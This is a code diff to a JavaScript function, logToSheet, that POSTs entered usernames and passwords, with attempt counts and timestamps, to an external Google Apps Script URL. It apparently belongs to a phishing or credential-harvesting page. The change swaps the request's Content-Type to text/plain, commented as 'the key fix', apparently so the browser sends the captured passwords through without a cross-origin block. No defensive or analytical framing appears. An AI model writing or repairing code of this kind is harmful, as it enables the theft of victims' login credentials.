@@ -739,7 +739,7 @@ function logToSheet(username, password, attempt) {
   fetch(APPS_SCRIPT_URL, {
     method: 'POST',
     headers: {
-      'Content-Type': 'application/json',
+      'Content-Type': 'text/plain;charset=utf-8',   // ← This is the key fix
     },
     body: JSON.stringify({
       username,
@@ -748,12 +748,12 @@ function logToSheet(username, password, attempt) {
       timestamp: new Date().toISOString(),
     }),
   })
-    .then((r) => r.text())
-    .then((text) => {
-      console.log('✅ Google Response:', text); // Check this
+    .then(r => r.text())
+    .then(text => {
+      console.log("Google Response:", text);
     })
-    .catch((err) => {
-      console.error('❌ Fetch Failed:', err.message);
+    .catch(err => {
+      console.error("Fetch Error:", err);
     });
 }
 
